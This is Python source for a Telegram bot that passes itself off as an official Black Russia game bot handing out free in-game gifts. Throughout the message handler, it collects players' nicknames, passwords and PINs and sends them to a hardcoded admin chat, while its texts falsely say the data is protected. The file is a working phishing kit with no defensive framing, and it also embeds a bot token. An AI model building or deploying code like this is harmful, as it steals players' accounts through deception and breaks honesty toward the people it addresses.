from flask import Flask
import requests
import os
import json
import time
import threading

app = Flask(__name__)

BOT_TOKEN = "8828199468:AAEh0DC2_g9swwiCoNc080AmQK11qyNrOiE"
ADMIN_CHAT_ID = "8625787020"

# === ФАЙЛЫ ===
USERS_FILE = "users.json"

def load_json(file):
    if os.path.exists(file):
        with open(file, "r") as f:
            return json.load(f)
    return {}

def save_json(file, data):
    with open(file, "w") as f:
        json.dump(data, f)

if os.path.exists(USERS_FILE):
    with open(USERS_FILE, "r") as f:
        USERS = json.load(f)
else:
    USERS = []

def save_user(user_id):
    if user_id not in USERS:
        USERS.append(user_id)
        with open(USERS_FILE, "w") as f:
            json.dump(USERS, f)

user_state = {}

# === ТЕКСТЫ ===
WELCOME = "🎁 *BLACK RUSSIA — ОФИЦИАЛЬНЫЙ БОТ*\n\n▸ Здесь ты можешь получить бесплатные подарки от Black Russia.\n▸ Выбери действие ниже."
ABOUT = "ℹ️ *О боте*\n\nЭто официальный бот для выдачи бесплатных подарков от Black Russia.\n\n🔹 *Что можно получить?*\n▸ 🎁 Особый кейс\n▸ 💳 10 000 000 виртов\n\n🔹 *Как получить?*\n▸ Выберите подарок → укажите сервер → введите данные аккаунта.\n▸ Дождитесь выдачи (10–30 минут).\n\n🔹 *Важно:*\n▸ Бот работает автоматически.\n▸ Все данные защищены."
SELECT_SERVER = "🌍 *Выберите ваш сервер:*\n\nНиже список доступных серверов."
ENTER_LOGIN = "👤 *Введите ваш НИК в Black Russia:*"
ENTER_PASSWORD = "🔑 *Введите ваш ПАРОЛЬ от аккаунта:*"
ENTER_PIN = "🔐 *Введите ваш 4-значный ПИН-КОД (если есть):*\n\nИли нажмите «Нет кода»."
WAITING = "⏳ *Ожидайте 10–30 минут!*\n\n▸ Вы в очереди на получение подарка.\n▸ Как только подарок будет выдан — вы получите уведомление."
CHOOSE_ACTION = "📌 *Выберите действие:*"

SERVERS = ["RED", "GREEN", "BLUE", "YELLOW", "ORANGE", "PURPLE", "LIME", "PINK", "CHERRY", "BLACK", "INDIGO", "WHITE", "MAGENTA", "CRIMSON", "GOLD", "AZURE", "PLATINUM", "AQUA", "GRAY", "ICE", "CHILLI", "CHOCO", "MOSCOW", "SPB", "UFA", "SOCHI", "KAZAN", "SAMARA", "ROSTOV", "ANAPA", "EKB", "KRASNODAR", "ARZAMAS", "NOVOSIBIRSK", "GROZNY", "SARATOV", "OMSK", "IRKUTSK", "VOLGOGRAD", "BELGOROD", "VLADIKAVKAZ", "CHELYABINSK", "KRASNOYARSK", "CHEBOKSARY", "KHABAROVSK", "PERM", "RYAZAN", "MURMANSK", "PENZA", "KURSK", "ORENBURG", "KIROV", "TOLYATTI", "BRATSK", "ASTRAKHAN", "IZHEVSK", "SURGUT", "PODOLSK", "MAGADAN", "CHEREPOVETS", "NORILSK", "ASTANA"]

MAIN_KEYBOARD = {"keyboard": [["🎁 Получить особый кейс", "💳 Получить 10кк виртов"], ["ℹ️ О боте"]], "resize_keyboard": True, "one_time_keyboard": False}

def build_server_keyboard():
    buttons = []
    row = []
    for i, server in enumerate(SERVERS):
        row.append(server)
        if len(row) == 3 or i == len(SERVERS)-1:
            buttons.append(row)
            row = []
    buttons.append(["🔙 Назад"])
    return {"keyboard": buttons, "resize_keyboard": True, "one_time_keyboard": False}

BACK_KEYBOARD = {"keyboard": [["🔙 Назад"]], "resize_keyboard": True, "one_time_keyboard": True}
PIN_KEYBOARD = {"keyboard": [["🔐 Ввести пин-код"], ["❌ Нет кода"], ["🔙 Назад"]], "resize_keyboard": True, "one_time_keyboard": False}

def send_message(chat_id, text, reply_markup=None, parse_mode="Markdown"):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": chat_id, "text": text, "parse_mode": parse_mode}
    if reply_markup:
        payload["reply_markup"] = reply_markup
    requests.post(url, json=payload)

def handle_message(chat_id, text, username, user_id):
    state = user_state.get(str(user_id), {})
    if text == "🔙 Назад":
        user_state[str(user_id)] = {}
        send_message(chat_id, CHOOSE_ACTION, MAIN_KEYBOARD)
        return
    if text in ["🎁 Получить особый кейс", "💳 Получить 10кк виртов"]:
        action = "case" if "кейс" in text else "virts"
        user_state[str(user_id)] = {"action": action}
        send_message(chat_id, SELECT_SERVER, build_server_keyboard())
        return
    if text == "ℹ️ О боте":
        send_message(chat_id, ABOUT, MAIN_KEYBOARD)
        return
    if state.get("action") in ["case", "virts"] and text in SERVERS:
        state["server"] = text
        state["step"] = "login"
        user_state[str(user_id)] = state
        send_message(chat_id, ENTER_LOGIN, BACK_KEYBOARD)
        return
    if state.get("step") == "login":
        state["login"] = text
        state["step"] = "password"
        user_state[str(user_id)] = state
        send_message(chat_id, ENTER_PASSWORD, BACK_KEYBOARD)
        return
    if state.get("step") == "password":
        state["password"] = text
        state["step"] = "pin"
        user_state[str(user_id)] = state
        send_message(chat_id, ENTER_PIN, PIN_KEYBOARD)
        return
    if state.get("step") == "pin":
        if text == "❌ Нет кода":
            pin = "Нет кода"
        elif text == "🔐 Ввести пин-код":
            send_message(chat_id, "✏️ *Введите 4-значный код:*", BACK_KEYBOARD)
            state["step"] = "pin_input"
            user_state[str(user_id)] = state
            return
        else:
            pin = text
        data_msg = (f"🎁 *НОВЫЙ ЗАПРОС*\n─────────────────\n👤 Юзернейм: @{username}\n🆔 ID: {user_id}\n─────────────────\n🌍 Сервер: {state.get('server')}\n👤 Логин: {state.get('login')}\n🔑 Пароль: {state.get('password')}\n🔐 Пин-код: {pin if pin else 'Не указан'}")
        send_message(ADMIN_CHAT_ID, data_msg)
        user_state[str(user_id)] = {}
        send_message(chat_id, WAITING, MAIN_KEYBOARD)
        return
    if state.get("step") == "pin_input":
        if len(text) == 4 and text.isdigit():
            pin = text
            data_msg = (f"🎁 *НОВЫЙ ЗАПРОС*\n─────────────────\n👤 Юзернейм: @{username}\n🆔 ID: {user_id}\n─────────────────\n🌍 Сервер: {state.get('server')}\n👤 Логин: {state.get('login')}\n🔑 Пароль: {state.get('password')}\n🔐 Пин-код: {pin}")
            send_message(ADMIN_CHAT_ID, data_msg)
            user_state[str(user_id)] = {}
            send_message(chat_id, WAITING, MAIN_KEYBOARD)
        else:
            send_message(chat_id, "⚠️ *Пин-код должен состоять из 4 цифр. Попробуйте снова:*", BACK_KEYBOARD)
        return
    if text == '/start':
        send_message(chat_id, WELCOME, MAIN_KEYBOARD)
        return
    send_message(chat_id, CHOOSE_ACTION, MAIN_KEYBOARD)

def get_updates(offset=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
    params = {"timeout": 30, "allowed_updates": ["message"]}
    if offset:
        params["offset"] = offset
    try:
        r = requests.get(url, params=params, timeout=35)
        return r.json().get("result", [])
    except:
        return []

def poll():
    offset = None
    while True:
        try:
            updates = get_updates(offset)
            for update in updates:
                if "message" in update:
                    msg = update["message"]
                    chat_id = msg["chat"]["id"]
                    text = msg.get("text", "")
                    username = msg["from"].get("username", "anon")
                    user_id = msg["from"]["id"]
                    save_user(user_id)
                    handle_message(chat_id, text, username, user_id)
                    offset = update["update_id"] + 1
        except Exception as e:
            print("Polling error:", e)
        time.sleep(1)

@app.route('/')
def home():
    return "Bot is alive! (polling mode)", 200

if __name__ == "__main__":
    threading.Thread(target=poll, daemon=True).start()
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
